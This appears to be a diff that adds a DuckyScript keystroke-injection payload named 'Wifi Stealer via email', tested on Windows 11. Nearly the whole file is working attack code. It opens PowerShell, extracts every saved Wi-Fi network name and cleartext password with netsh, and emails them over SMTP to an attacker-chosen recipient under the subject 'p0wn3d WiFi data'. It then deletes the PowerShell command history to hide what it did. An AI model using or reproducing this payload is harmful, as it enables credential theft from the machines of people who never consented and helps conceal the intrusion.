@@ -1,0 +1,124 @@
+REM Title: Wifi Stealer via email
+REM Author: DrG0n20
+REM Target: Tested on Windows 11
+REM Version: 0.1
+REM Category: Grabber
+REM Description: Extracts the SSIDs and wifi shared keys stored in a computer and sends them via email
+
+REM Open PowerShell
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Display "Retrieving WiFi passwords..." message
+STRING Write-Host "Retrieving WiFi passwords..." -ForegroundColor Green
+ENTER
+DELAY 200
+
+REM Retrieves all saved WiFi SSID with passwords (where needed)
+STRING_DELAY 20
+STRING $WifiData = ""; (netsh wlan show profiles) -split "`r`n" | ForEach-Object { if ($_ -match ":(.+)$") { $profileName = $matches[1].Trim(); $wifiDetails = netsh wlan show profiles "$profileName" key=clear; $ssid = ($wifiDetails | Select-String "SSID name").Line -replace "SSID name *: ", ""; $keyContent = ($wifiDetails | Select-String "Key Content").Line -replace "Key Content *: ", ""; if (!$keyContent) { $keyContent = "No password needed" }; $WifiData += "$($ssid.Trim()): $($keyContent.Trim())`n" } }
+ENTER
+DELAY 2500
+
+REM Output the final result stored in $output for review
+STRING $WiFiData
+ENTER
+DELAY 200
+
+REM Display "Sending email..." message
+STRING Write-Host "Sending email..." -ForegroundColor Green
+ENTER
+DELAY 200
+
+REM Set SMTP server (Enter the SMTP server here)
+STRING $SmtpServer = 'your.smtp.server'
+ENTER
+DELAY 500
+
+REM Set SMTP User (Enter the user email here)
+STRING $SmtpUser = 'your@email.org'
+ENTER
+DELAY 500
+
+REM Set SMTP Password (Enter the password here)
+STRING $SmtpPassword = 'your-password'
+ENTER
+DELAY 500
+
+REM Set SMTP Port
+STRING $SmtpPort = 587
+ENTER
+DELAY 500
+
+REM Set Mail Recipient (You need to enter the recipient email here)
+STRING $MailTo = 'recipient@email.org'
+ENTER
+DELAY 500
+
+REM Set Mail From (You need to enter the sender email here)
+STRING $MailFrom = 'sender@email.org'
+ENTER
+DELAY 500
+
+REM Set Mail Subject
+STRING $MailSubject = "p0wn3d WiFi data"
+ENTER
+DELAY 500
+
+REM Set Mail Body
+STRING $MailBody = $WiFiData
+ENTER
+DELAY 500
+
+REM Create Secure Password from Plain Text
+STRING_DELAY 20
+STRING $SecurePassword = ConvertTo-SecureString $SmtpPassword -AsPlainText -Force
+ENTER
+DELAY 500
+
+REM Create Credential object (No user input)
+STRING_DELAY 20
+STRING $Credentials = New-Object System.Management.Automation.PSCredential($SmtpUser, $SecurePassword)
+ENTER
+DELAY 1000
+
+REM Create SMTP Client and set options
+STRING_DELAY 20
+STRING $smtpClient = New-Object Net.Mail.SmtpClient($SmtpServer, $SmtpPort)
+ENTER
+DELAY 500
+STRING $smtpClient.EnableSsl = $true
+ENTER
+DELAY 500
+STRING $smtpClient.Credentials = $Credentials
+ENTER
+DELAY 500
+
+REM Create MailMessage object
+STRING_DELAY 20
+STRING $mailMessage = New-Object Net.Mail.MailMessage($MailFrom, $MailTo, $MailSubject, $MailBody)
+ENTER
+DELAY 500
+
+REM Send email using SmtpClient
+STRING $smtpClient.Send($mailMessage)
+ENTER
+DELAY 3000
+
+REM Display "Done." message
+STRING Write-Host "Done" -ForegroundColor Green
+ENTER
+DELAY 500
+
+REM Remove the PowerShell history file to clear history
+STRING_DELAY 20
+STRING Remove-Item "$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
+ENTER
+DELAY 1000
+
+REM Exit PowerShell (auto-close the window)
+STRING exit
+ENTER
